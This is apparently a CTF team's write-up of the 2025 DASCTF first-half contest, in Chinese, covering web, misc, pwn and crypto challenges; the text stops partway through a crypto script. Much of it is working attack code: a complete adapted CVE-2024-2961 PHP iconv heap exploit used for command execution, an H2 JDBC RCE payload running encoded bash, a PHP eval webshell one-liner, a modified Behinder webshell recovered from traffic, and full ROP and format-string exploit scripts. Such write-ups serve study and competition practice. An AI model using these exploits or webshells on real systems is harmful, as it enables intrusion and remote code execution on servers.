---
title: 2025 DASCTF上半年赛 SU WriteUp
tags: ["DASCTF"]
date: 2025-06-21 21:29:17
slug: "2025-dasctf-first-half-su-wu"
---

感谢 08067Sec 的师傅们精心准备的比赛！本次DASCTF我们 SU 取得了 第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。

以下是我们 SU 本次 2025 DASCTF 上半年赛的 部分writeup以及赛后解出的部分题目。

<!--more-->

![img](QQ20250621-212945.jpg)

# Web

## Phpms（赛后）

扫描出git，进行git恢复

```Assembly
dirsearch -u http://123154c5-c64a-427f-b8cf-be5127016c3a.node5.buuoj.cn:81/ --threads 3 --delay 2

githacker --url http://123154c5-c64a-427f-b8cf-be5127016c3a.node5.buuoj.cn/.git/ --output-folder test --delay 2 --threads 3

git log --oneline
git show 613dea6

git stash list
git stash show -p
```

![img](fb9dd69d-4af3-469c-adad-31e922d4d2ac.png)

发现php基础函数都不存在，只有原生类，现在可以列出目录以及读取一些有权限的文件

```Assembly
?shell=?><?php $content=new SplFileObject('no_careee.php');foreach($content as $content){echo $content."<br>";}?>
?shell=?><?php $content=new SplFileObject('/etc/passwd');foreach($content as $content){echo $content."<br>";}?>

?shell=?><?php $a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

发现Redis服务，读取`/etc/redis.conf`得到Redis密码为`admin123`，这里可以打CVE-2024-2961，修改exp关键部分

```Python
def send(self, path: str) -> Response:
    """Sends given `path` to the HTTP server. Returns the response.
    """
    payload = f"?shell=?><?php $content=new SplFileObject('{path}');foreach($content as $line)echo $line;?>"
    return self.session.get(self.url + payload)
    
def download(self, path: str) -> bytes:
    """Returns the contents of a remote file.
    """
    path = f"php://filter/convert.base64-encode/resource={path}"
    response = self.send(path)
    data = response.re.search(b"(.*)", flags=re.S).group(1)
    return base64.decode(data)
```

执行命令

```Python
python3 cnext-exploit.py http://08b32553-2ead-4148-8ae2-246361272c33.node5.buuoj.cn:81/ "echo '<?php @eval(\$_POST[1]);?>' > 1.php"
```

没成功，换了一个项目来尝试，https://github.com/kezibei/php-filter-iconv

```Python
/proc/self/maps
得到
/lib/x86_64-linux-gnu/libc-2.31.so
```

然后修改exp

```Bash
maps_path = './maps'
cmd = 'echo 1 > /tmp/1.txt'
sleep_time = 1
padding = 20

if not os.path.exists(maps_path):
    exit("[-]no maps file")

regions = get_regions(maps_path)
heap, libc_info = get_symbols_and_addresses(regions)

libc_path = libc_info.path
print("[*]download: "+libc_path)

libc_path = './libc-2.31.so'
if not os.path.exists(libc_path):
    exit("[-]no libc file")
```

成功了，分段写入sh准备和Redis交互

```Bash
#!/bin/bash
h=127.0.0.1;p=6379;a=admin123
k=$(redis-cli -h $h -p $p -a $a --raw KEYS '*')
for x in $k;do
 v=$(redis-cli -h $h -p $p -a $a --raw GET $x)
 echo $x=>$v>/tmp/2.txt
done
```

处理压缩，避免长度超过

```Bash
gzip -c 1.sh | base64 -w 0

echo H4sICAOuVmgAAzEuc2gAjcuxCoMwGEXhPU9xS3+wFmKqQqVI3KRDx3bpGI2SYE2CivXx6yOUs3zLOR5EY51o1GyYkWlWJJe9tAzymhe3UkmlR+vSLGeDpNPUaTvz9mPBDciAB1AAVyAFzif1xaN+PxGdo5j1fsIG60BDqT3D+td/r1+gLWboWuN3yYrWSixjEFmybAvT3nXsBzLb30e1AAAA | base64 -d | gzip -d > /tmp/1.sh
```

最后发现maps和libc和动态的，所以和出题人`@L1mbo`交流，并且要到了exp，自己修改了一下，害的是一把锁啊

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from dataclasses import dataclass
import re
import sys
import requests
from pwn import *
import zlib
import os
import binascii


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")

@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self):
        return self.stop - self.start


def print_hex(data):
    hex_string = binascii.hexlify(data).decode()
    print(hex_string)


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.b64encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload


def _get_region(regions, *names):
    """Returns the first region whose name matches one of the given names."""
    for region in regions:
        if any(name in region.path for name in names):
            break
    else:
        pass
    return region


def find_main_heap(regions):
    # Any anonymous RW region with a size superior to the base heap size is a
    # candidate. The heap is at the bottom of the region.
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == "rw-p"
        and region.size >= HEAP_SIZE
        and region.stop & (HEAP_SIZE - 1) == 0
        and region.path == ""
    ]

    if not heaps:
        pass

    first = heaps[0]

    if len(heaps) > 1:
        heaps = ", ".join(map(hex, heaps))
        print("Potential heaps: " + heaps + " (using first)")
    else:
        # print("[*]Using " + hex(first) + " as heap")
        pass

    return first


def get_regions(maps_path):
    """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
    f = open('maps', 'rb')
    maps = f.read().decode()
    PATTERN = re.compile(
        r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
    )
    regions = []
    for region in maps.split("\n"):
        # print(region)
        match = PATTERN.match(region)
        if match:
            start = int(match.group(1), 16)
            stop = int(match.group(2), 16)
            permissions = match.group(3)
            path = match.group(4)
            if "/" in path or "[" in path:
                path = path.rsplit(" ", 1)[-1]
            else:
                path = ""
            current = Region(start, stop, permissions, path)
            regions.append(current)
        else:
            # print("[*]Unable to parse memory mappings")
            pass

    # print("[*]Got " + str(len(regions)) + " memory regions")
    return regions


def get_symbols_and_addresses(regions):
    # PHP's heap
    heap = find_main_heap(regions)

    # Libc
    libc_info = _get_region(regions, "libc-", "libc.so")

    return heap, libc_info


def build_exploit_path(libc, heap, sleep, padding, cmd):
    LIBC = libc
    ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
    ADDR_EFREE = LIBC.symbols["__libc_system"]
    ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]
    ADDR_HEAP = heap
    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

    CS = 0x100

    # Pad needs to stay at size 0x100 at every step
    pad_size = CS - 0x18
    pad = b"\x00" * pad_size
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = compressed_bucket(pad)

    step1_size = 1
    step1 = b"\x00" * step1_size
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, CS)
    step1 = compressed_bucket(step1)

    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

    step2_size = 0x48
    step2 = b"\x00" * (step2_size + 8)
    step2 = chunked_chunk(step2, CS)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3_size = CS

    step3 = b"\x00" * step3_size
    assert len(step3) == CS
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
    assert len(step3_overflow) == CS
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4_size = CS
    step4 = b"=00" + b"\x00" * (step4_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    # This chunk will eventually overwrite mm_heap->free_slot
    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
    step4_pwn = ptr_bucket(
        0x200000,
        0,
        # free_slot
        0,
        0,
        ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=CS,
    )

    step4_custom_heap = ptr_bucket(
        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
    )

    step4_use_custom_heap_size = 0x140

    COMMAND = cmd
    COMMAND = f"kill -9 $PPID; {COMMAND}"
    if sleep:
        COMMAND = f"sleep {sleep}; {COMMAND}"
    COMMAND = COMMAND.encode() + b"\x00"

    assert (
            len(COMMAND) <= step4_use_custom_heap_size
    ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

    step4_use_custom_heap = COMMAND
    step4_use_custom_heap = qpe(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
    pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * padding
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
    )

    resource = compress(compress(pages))
    resource = b64(resource)
    resource = f"data:text/plain;base64,{resource.decode()}"

    filters = [
        # Create buckets
        "zlib.inflate",
        "zlib.inflate",

        # Step 0: Setup heap
        "dechunk",
        "convert.iconv.latin1.latin1",

        # Step 1: Reverse FL order
        "dechunk",
        "convert.iconv.latin1.latin1",

        # Step 2: Put fake pointer and make FL order back to normal
        "dechunk",
        "convert.iconv.latin1.latin1",

        # Step 3: Trigger overflow
        "dechunk",
        "convert.iconv.UTF-8.ISO-2022-CN-EXT",

        # Step 4: Allocate at arbitrary address and change zend_mm_heap
        "convert.quoted-printable-decode",
        "convert.iconv.latin1.latin1",
    ]
    filters = "|".join(filters)
    path = f"php://filter/read={filters}/resource={resource}"
    path = path.replace("+", "%2b")
    return path

# -------------------------- 简化版主函数 --------------------------
def exp():
    ip = "cd75b1b6-18d7-4482-911c-43be6f8dbeab.node5.buuoj.cn"
    port = "81"
    url = f"http://{ip}:{port}/"

    maps = base64.b64decode(requests.get(
        f"{url}?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/proc/self/maps%27);foreach($context%20as%20$f){{echo($f);}}"
    ).text)
    open("maps", "wb").write(maps)

    libc = base64.b64decode(requests.get(
        f"{url}?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so%27);foreach($context%20as%20$f){{echo($f);}}"
    ).text)
    open("libc-2.23.so", "wb").write(libc)

    regions = get_regions("maps")
    heap, libc_info = get_symbols_and_addresses(regions)
    libc = ELF("libc-2.23.so", checksec=False)
    libc.address = libc_info.start

    cmd = "(echo \"auth admin123\nkeys *\nget flag\" | redis-cli) > /tmp/1.txt"
    payload = build_exploit_path(libc, heap, sleep=1, padding=20, cmd=cmd)

    try:
        requests.get(f"{url}?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27{payload}%27);foreach($context%20as%20$f){{echo($f);}}")
    except:
        pass
    time.sleep(2)

    result = requests.get(f"{url}?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27/tmp/1.txt%27);foreach($context%20as%20$f){{echo($f);}}").text
    match = re.search(r"DASCTF{.*?}", result)
    if match:
        print("[+] Got flag:", match.group(0))
    else:
        print("[-] Flag not found")

# --------------------------
if __name__ == '__main__':
    exp()

```

## 泽西岛（赛后）

不出网H2 RCE，利用war包部署，可以直接写入文件

鉴权绕过

```TypeScript
public void filter(ContainerRequestContext containerRequestContext) {
    String path = containerRequestContext.getUriInfo().getPath();
    if (!isBaseFile(path) && !WHITELIST.contains(path)) {
        String authHeader = containerRequestContext.getHeaderString("Authorization");
        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            String token = authHeader.substring("Bearer ".length());

            try {
                DecodedJWT var5 = JwtValidator.verifyJwt(token);
            } catch (Exception var6) {
                this.abortWithUnauthorized(containerRequestContext);
            }

        } else {
            this.abortWithUnauthorized(containerRequestContext);
        }
    }
}

private void abortWithUnauthorized(ContainerRequestContext containerRequestContext) {
    containerRequestContext.abortWith(Response.status(Status.UNAUTHORIZED).header("Location", "/401.jsp").build());
}

private static boolean isBaseFile(String path) {
    return !path.contains("/") && path.contains(".");
}
```

重点在这里

```TypeScript
private static boolean isBaseFile(String path) {
    return !path.contains("/") && path.contains(".");
```

配置了静态资源的访问，导致了绕过。直接访问/api/testConnect;.js即可

直接打JDBC RCE就可以，需要一个参数，参考文章

https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html

这里直接注释掉，利用$CATALINA_HOME确定tomcat的根目录

构造Payload

```Plain
jdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INI\T=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\;}'\;CALL EXEC ('bash -c {echo,Y2F0IC9mbGFnID4gJENBVEFMSU5BX0hPTUUvd2ViYXBwcy9ST09ULzQwNC5qc3A\=}|{base64,-d}|{bash,-i}')\;--\
```

# Misc

## BlueTrace

一开始先用neta梭了一下，发现能得到一张jpg，发现显示不全

![img](01279d99-7aaa-4fbe-b3f8-8c406ecf39e4.png)

猜测是neta提取的有问题，估计是做限制了，故转手搓：

众所周知蓝牙传输的协议一般是obex，所以过滤一下，可以发现这里明显是传了一个jpg的

![img](33618614-7e91-4c5f-a7d4-055098b8a52f.png)

用tshark导出一下

```Plain
tshark -r BlueTrace.pcapng -Y "obex" -T fields -e data > obex_payload.txt
```

导出后将数据拉到010，分析一下会发现藏了一个压缩包（可以直接将流量包拿去binwalk就会发现有这么个压缩包了）

![img](fd147174-057a-4b4e-b7c2-c19fad4ce93a.png)

全部提取出来，根据010的模板会发现内容是不全的

![img](7a0a5ddc-f7e4-4136-a343-baa4fbe15438.png)

回到wireshark分析一下，会发现在最后面还漏了一个流量数据，将他单独提取出来拼上后即可修复压缩包

![img](604fb2fb-2908-4fa7-84b1-5d95d5a7ee69.png)

打开后它提示我们密码是蓝牙传输的目标电脑名字

![img](a0b85729-7f2a-4fb2-9920-5a9135aa631a.png)

在wireshark的无线中找到蓝牙设备，然后简单遍历一下就知道密码是`INFERNITYのPC`

![img](6b95853a-1064-4cec-b6e9-49d61a22f66d.png)

解压得到一张奇怪的png图，猜测是lsb隐写，stegsolve分析找到flag

![img](6135bd3f-db5e-436d-87cb-603e8139a4c1.png)

## Webshell Plus

根据题意易得webshell流量，那么就看是哪种常见的，简单分析可以发现传了个shell.php

![img](26764c97-ca32-4fdf-8663-1181593712d9.png)

其内容如下，不难看出就是冰蝎，但又不太一样，显然魔改了，一开始会进行检测，当攻击者进行密钥交换时（传入gene_key和public_key），shell的key为一个随机的8字节的字符串转hex后取md5的前16个字符，然后用这个key结合传入的public_key进行openssl加密，最后输出被两个8长度的伪造base64字符串包含的base64字符串

```php
------WebKitFormBoundary2AdFNokm3wx5QuXV 
Content-Disposition: form-data; name="file"; filename="shell.php" 
Content-Type: text/php 
 
<?php
@error_reporting(0);
session_start();
function geneB64RandStr(int $length): string
{
    $validChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $maxIndex = strlen($validChars) - 1;
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $validChars[random_int(0, $maxIndex)];
    }
    return $randomString;
}
if (isset($_POST['gene_key']) and $_POST['public_key']) {
    echo geneB64RandStr(8);
    $public_key = base64_decode($_POST['public_key']);
    $p = bin2hex(random_bytes(8));
    $key = substr(md5($p), 0, 16);
    $_SESSION['k'] = $key;
    if (extension_loaded('openssl')) {
        openssl_public_encrypt($p, $encrypted_key, $public_key, OPENSSL_PKCS1_PADDING);
        echo base64_encode($encrypted_key);
        echo geneB64RandStr(8);
        exit();
    } else {
        die("OpenSSL extension not available");
    }
} else {
    if(!isset($_SESSION['k'])){
        $key = "e45e329feb5d925b"; // Default key: rebeyond
        $_SESSION['k'] = $key;
    }
}
$key = $_SESSION['k'];
 session_write_close();
 $post=file_get_contents("php://input");
 if(!extension_loaded('openssl'))
 {
  $t="base64_"."decode";
  $post=$t($post."");
  
  for($i=0;$i<strlen($post);$i++) {
        $post[$i] = $post[$i]^$key[$i+1&15]; 
       }
 }
 else
 {
  $post=openssl_decrypt($post, "AES128", $key);
 }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
 class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?> 
------WebKitFormBoundary2AdFNokm3wx5QuXV-- 

```

接着分析，发现攻击者确认传了这俩参数，所以key值就不是默认的了，可以看到回显就是被两个8长度的伪造base64字符串包含的base64字符串，现在要做的就是找到RSA的私钥去解出p值和key

![1](3c888a6d-f36e-43ef-b53a-85a8d18181de.png)

用厨子解一下传入的public_key，可以得到RSA的公钥，结合搜到的这篇文章

https://weiyubo.top/2019/03/31/RSA%20%E8%A7%A3%E5%AF%86%20%EF%BC%88%E5%B7%B2%E7%9F%A5%E5%85%AC%E9%92%A5%EF%BC%89/  爆破私钥

![img](2e926d28-f8fc-4254-957f-be28978ff2f6.png)

用这个在线网站https://www.ssleye.com/ssltool/pub_asysi.html  解出n，然后用yafu爆破得到p和q，接着按照文章操作得出私钥文件即可

![img](d78b73c2-3401-40e4-bc31-0384887b9250.png)

然后搓个脚本解出p和key

```python
from base64 import b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

# 将下面两项替换成你实际的数据
encrypted_b64 = "O+le5pAWzAptt0OhVjS5eDX3W3X766Hc8QbKMNflhkZM3t8HArZ8YRFM3G7h7MMYrcASwycx7aSU1OL2tChk3O/O8cjw/0C6Agx5qEDeiI3gtnic5/J+cLB0WcspW2t9OiqteGHBtXZx0cXUjUSU/7tPwfnOS3pXjrJRDisgSwE="
private_key_pem = """-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgFgmOymT9EJvC8sHTWxov0LQWSomL5DPRiTUEnQnrDmKYGvNSNMJ3V1fR1hr9jQ6
oepvQvjMyWsyTL6J3n9nbOGd5tey/4BLTXHQyaXcSpfl3z61fBJzy91rZrXbzMY1adHH4VYyUoDQ
7qkF2/RVnR8PJVzRoJn+XaH3RabkzHitAgMBAAECgYAb6zfvykmhxPQSQOTXwjFZow2qmN+V2OBZ
h8W0fmBA9T/mxOUc2lH/Yc8CBWe8URm5W7X1gT8GMa825gnPhl1olOcG9QDtvsWZlLa2YIE1VmH9
VexRu+CTaA8YfdQlOQP81P5A8kLOfpqAwvOa166HTTUOLZj1t/wn5DNGDdDnTQJBAJY4ecYJt6OW
6LJsCDoPHDjYPZCtcAv3rAhawzNhltW7Zd5uzN0GqigOWpt+u63pnRXb2HYp2zR5sR/HBbXRqoMC
QQCWOHnGCbejluiybAg6Dxw42D2QrXAL96wIWsMzYZbVu2XebszdBqooDlqbfrut6Z0V29h2Kds0
ebEfxwW10akPAkAomKSYF2IwbIUASt/CSPkYh5/DrIteQJWWQGkGRrZLlnRGM21bwgRUBOUJpqsz
qbGRCbOq407hFI4Ah3mMlFffAkANotDC/kzSJ7e1woK4qnh4XICyKlw6aeAO3hZMCrbDbgBgQZSN
F7bIbg0hgk6NCeC9hDhQ+ZmxWL6QUOOezopXAkAJSa9xZ9Ocse67NBlIaCj4gPuMYs8viR6X6hW0
CXl/c4Aa0+0Cp6NLbD4IPNMseRxK/GNnpl9yCkbSexnQvzMl
-----END RSA PRIVATE KEY-----"""

# 解码Base64后的密文
encrypted_bytes = b64decode(encrypted_b64)

# 导入私钥
rsa_key = RSA.import_key(private_key_pem)
cipher_rsa = PKCS1_v1_5.new(rsa_key)

# 解密
sentinel = b""
decrypted_p = cipher_rsa.decrypt(encrypted_bytes, sentinel)

# 输出结果
print("[+] Recovered p (hex):", decrypted_p)
print("[+] Derived AES key (md5(p)[:16]):", __import__("hashlib").md5(decrypted_p).hexdigest()[:16])

# [+] Recovered p (hex): b'519a73ca97a9e3ea'
# [+] Derived AES key (md5(p)[:16]): d14d8ce94563e71a
```

得到key就可以对流量解密了

用在线网站 http://tools.bugscaner.com/cryptoaes/ 解密，然后base64解一下msg，最后爆破shadow的hash即可得到密码

![img](d10d1d52-b2ec-4fd6-81c9-4785a7028753.png)

![img](8e853000-f963-4e15-8f83-b8a3275b16d4.png)

![img](89855f6a-481a-427e-81ad-63ec6883d3f2.png)

md5之后就是flag

# Pwn

## mini

Only read 挑战，给了 pop rax 但是我没有用到，

参考这个文章的3 个 gadget https://github.com/imLZH1/2025-CTF-writep/tree/main/2025-smileyCTF#pwnbabyrop

```Python
from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = 'node5.buuoj.cn:29466'.replace(' ',':')
binary = './chal'

def start(argv=[], *a, **kw):
    if args.GDB:return gdb.debug(binary,gdbscript)
    if args.TAG:return remote(*args.TAG.split(':'))
    if args.REM:return remote(*attack.split(':'))
    return process([binary] + argv, *a, **kw)

context(binary = binary, log_level = 'debug',
terminal='tmux splitw -h -l 170'.split(' '))
#libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
gdbscript = '''
b * 0x0040114E
#continue
'''.format(**locals())
#import os
#os.systimport os
#io = remote(*attack.split(':'))
io = start([])

bss = 0x404000 + 0x800

ret1 = 0x0401133

pay = b'a' *0x10
pay += p64(0x404000 + 0xe00)
pay += p64(ret1)
s(pay)

add_ebx = 0x000000000040110c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
magic2  = 0x4010FC
start   = 0x401049

rax = 0x0000000000401126 # pop rax ; ret
rbp = 0x000000000040110d # pop rbp ; ret

rop = [
    0xbeef,
    bss + 0x800,
    rbp,
    0x404ef8 - 0x48,
    magic2,
    0,
    start
        ]

#pay  = p64(0xbeef) + p64(0x0)
#pay += p64(bss)
#pay += p64(ret1)
#s(pay)
bss += 8
offset1 = 0xb323e

pay  = p64(0xbeefbeef1) + p64(0xbeefbeef2)
pay += p64(0x000401049)
pay += p64(start)
s(pay)
pause()

pay = b'a' *0x10
pay += p64(bss+0x4d8+0xb8)
pay += p64(ret1)
s(pay)
pause()

pay = b'a' *0x10
pay += p64(bss+0x18+0xb8+0x4d8)
pay += p64(ret1)
s(pay)
pause()

pay  = p64(rbp) + p64(bss+0x28+0xb8+0x4d8)
pay += p64(ret1)
#pay += p64(0x111111111)
s(pay)
pause()

lss('offset1')
pay = p64(rbp) + p64(0x404dc8-0x48)
pay += p64(magic2) + p64(offset1-0x21) # 这里不够回到 _start 函数，要提前在stack 上布置
s(pay)

pause()
lss('offset1')

oo = 0
pay = b'A' *0x10
pay += p64(bss+oo)
pay += p64(ret1)
s(pay)
pause()

pay = b'B' *0x10
pay += p64(bss+0x18+oo)
pay += p64(ret1)
s(pay)
pause()

offset = 0x404d68

pay  = p64(rbp) + p64(offset+0x3d)
pay += p64(add_ebx)
pay += p64(0x00401049)
s(pay)
pause()
oo = 0
pay = b'A' *0x10
pay += p64(bss+oo)
pay += p64(ret1)
s(pay)
pause()

pay = b'B' *0x10
pay += p64(bss+0x18+oo)
pay += p64(ret1)
s(pay)
pause()

#gdb.attach(io,gdbscript=gdbscript)
pay  = p64(rbp) + p64(0x404d60)
pay += p64(0x040114E)
s(pay)
#pause()

itr()
```

## NSUSServer

格式化字符串泄露地址， 然后 直接栈溢出

a.so 可以直接访问远程环境下载

![img](8312ebfa-6b66-4a8e-a565-57b42f3575ca.png)

访问一个不存在的文件时，会调用这个函数 存在格式化字符串漏洞

![img](90840edc-856b-4c9c-b041-35f1cc01a6c0.png)

```Python
from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = '127.0.0.1 9999'.replace(' ',':')
attack = 'node5.buuoj.cn:27338'.replace(' ',':')
binary = './attachment'

context(binary = binary, log_level = 'debug',
terminal='tmux splitw -h -l 170'.split(' '))
#libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
gdbscript = '''
#continue
'''.format(**locals())
#import os
#os.systimport os
io = remote(*attack.split(':'))
#io = start([])

n = 4
path = f'HACK%{n+0xf1}$p-%{n+0xf3}$p-%{n+0xf5}$p-HACK'
headers = (
    f"GET {path} HTTP/1.1\r\n"
    "\r\n"
)
s(headers)

ru('HACK')

canary = int(ru('-')[:-1],16)
libc_base = int(ru('-')[:-1],16) - 0x29d90
elf_base = int(ru('-')[:-1],16) - 0x0379E

lss('canary')
lss('libc_base')
lss('elf_base')

io = remote(*attack.split(':'))

rdi = libc_base + 0x000000000002a3e5 # pop rdi ; ret
rsi = libc_base + 0x000000000002be51 # pop rsi ; ret
flag =  elf_base + 0x043AB

pay = b'A' * 0x48
pay += p64(canary) * 2
pay += p64(0xbeefbeef)
pay += p64(0xbeef1)
pay += p64(rdi+1)
pay += p64(rsi)
pay += p64(flag)
pay += p64(rdi)
pay += p64(4)
pay += p64(elf_base + 0x2BA3)

headers = (
    b"GET /a.cgi?input=" + pay + b" HTTP/1.1\r\n"
    b"\r\n"
)
s(headers)

#pay = flat({
#},filler=b'\x00')
#gdb.attach(io,gdbscript)

# libc.address = libc_base
# system = libc.sym['system']
# bin_sh = next(libc.search(b'/bin/sh'))
itr()
```

# Crypto

## Excessive Security

ecdsa复用了随机数k1、k2和私钥x1、x2，四个式子整理一下就是两变量x1、x2和两个方程，可以用矩阵解。剩下打Franklin-Reiter攻击，系数大了点用HGCD即可。

```Python
n = 115792089237316195423570985008687907852837564279074904382605163141518161494337
Zn = Zmod(n)

s1 = Zn(70264613994433317101824708333691569351293428290775945022557096997867421112623)
s2 = Zn(27386247988345867998752358066350183725137348277248603318763377237810993039608)
h1 = Zn(68926494835039378729440404424793589316085902585443402029912033361291851069895)
h2 = Zn(99816429822339421445908151468618514820067970997726274244928092260385418279182)
r1 = Zn(95467825458659408375936425122753380788640181504557006906236884175684680903422)

s3 = Zn(108271537842404710192407976239166854351892165018292127464175836717873395489565)
s4 = Zn(100312693542625967610858608130705401648902828203826044299984002070083890684220)
h3 = Zn(100471089356874379799029324099340355602511511524623953182021635156113287196537)
h4 = Zn(53552261622392134420510144174810499568173979993026285111445672642139328877380)
r2 = Zn(13940715298251935708383205669373172931583958487449924842542107474174521484127)

A = Matrix(Zn, [
    [s2 * r1, -s1 * r1],
    [s4 * r2, -s3 * r2]
])
b = vector(Zn, [
    s1 * h2 - s2 * h1,
    s3 * h4 - s4 * h3
])

